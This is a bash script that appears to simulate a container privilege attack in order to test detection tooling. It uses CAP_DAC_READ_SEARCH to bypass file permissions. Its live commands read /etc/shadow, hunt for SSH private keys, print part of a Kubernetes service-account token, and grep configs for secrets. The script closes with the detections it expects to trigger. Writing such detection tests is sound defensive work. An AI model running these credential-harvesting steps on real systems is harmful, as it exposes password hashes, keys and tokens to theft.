#!/bin/bash
# Attack: CAP_DAC_READ_SEARCH File Access Bypass
# MITRE ATT&CK: Defense Evasion - T1222
# Severity: MEDIUM
# Description: Uses CAP_DAC_READ_SEARCH to bypass file permissions
# Prerequisites: Container must have CAP_DAC_READ_SEARCH capability

set -e
echo "[+] Starting: CAP_DAC_READ_SEARCH File Access Bypass"
echo "[+] MITRE ATT&CK: T1222 - File and Directory Permissions Modification"
echo "[+] Severity: MEDIUM"
echo ""

echo "[*] Step 1: Checking for CAP_DAC_READ_SEARCH capability..."
if command -v capsh &> /dev/null; then
    capsh --print | grep -i cap_dac_read_search && echo "[+] CAP_DAC_READ_SEARCH present!" || echo "[!] Capability not found"
else
    echo "[*] Checking capabilities:"
    grep "^Cap" /proc/self/status
fi

echo ""
echo "[*] Step 2: Understanding CAP_DAC_READ_SEARCH..."
echo "[*] This capability allows:"
echo "    - Bypass file read permission checks"
echo "    - Bypass directory read and execute permission checks"
echo "    - Read any file on the system"
echo "    - List contents of any directory"

echo ""
echo "[*] Step 3: Testing file access bypass..."
echo "[*] Creating test file with restricted permissions:"
echo "sensitive_data" > /tmp/restricted_file
chmod 000 /tmp/restricted_file
ls -l /tmp/restricted_file

echo ""
echo "[*] Attempting to read restricted file:"
if cat /tmp/restricted_file 2>/dev/null; then
    echo "[+] Successfully read file despite 000 permissions!"
    echo "[+] CAP_DAC_READ_SEARCH is functional!"
else
    echo "[!] Cannot read file - capability may not be granted"
fi
rm -f /tmp/restricted_file

echo ""
echo "[*] Step 4: Searching for sensitive files..."
echo "[*] Attempting to read typically restricted files:"

# Try to read shadow file
if [ -f /etc/shadow ]; then
    echo "[*] Attempting to read /etc/shadow:"
    head -3 /etc/shadow 2>/dev/null && echo "[+] Successfully read shadow file!" || echo "[!] Cannot read shadow"
fi

# Try to read SSH keys
echo ""
echo "[*] Searching for SSH private keys:"
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | head -5 | while read key; do
    echo "[+] Found key: $key"
    ls -l "$key" 2>/dev/null || true
done

echo ""
echo "[*] Step 5: Accessing Kubernetes secrets (if available)..."
if [ -d /var/run/secrets/kubernetes.io/serviceaccount ]; then
    echo "[+] Found Kubernetes service account secrets:"
    ls -la /var/run/secrets/kubernetes.io/serviceaccount/
    echo "[*] Token (first 50 chars):"
    head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "[!] Cannot read token"
fi

echo ""
echo "[*] Step 6: Searching for credentials in restricted directories..."
echo "[*] Common sensitive locations:"
for dir in /root/.ssh /root/.aws /root/.kube /etc/ssl/private; do
    if [ -d "$dir" ]; then
        echo "[+] Accessing: $dir"
        ls -la "$dir" 2>/dev/null | head -5 || echo "[!] Access denied"
    fi
done

echo ""
echo "[*] Step 7: Reading application configs..."
echo "[*] Searching for config files with credentials:"
find /etc -name "*.conf" -o -name "*.cfg" 2>/dev/null | head -5 | while read conf; do
    if grep -i "password\|secret\|token" "$conf" 2>/dev/null >/dev/null; then
        echo "[+] Found credentials in: $conf"
    fi
done

echo ""
echo "[✓] CAP_DAC_READ_SEARCH bypass simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Read shadow file for password hashes"
echo "    - Access SSH private keys"
echo "    - Read application secrets"
echo "    - Steal TLS/SSL private keys"
echo "    - Access database credentials"
echo ""
echo "[!] Expected detections:"
echo "    - Container with CAP_DAC_READ_SEARCH"
echo "    - Access to sensitive files"
echo "    - Reading of restricted directories"
echo "    - Credential theft attempts"
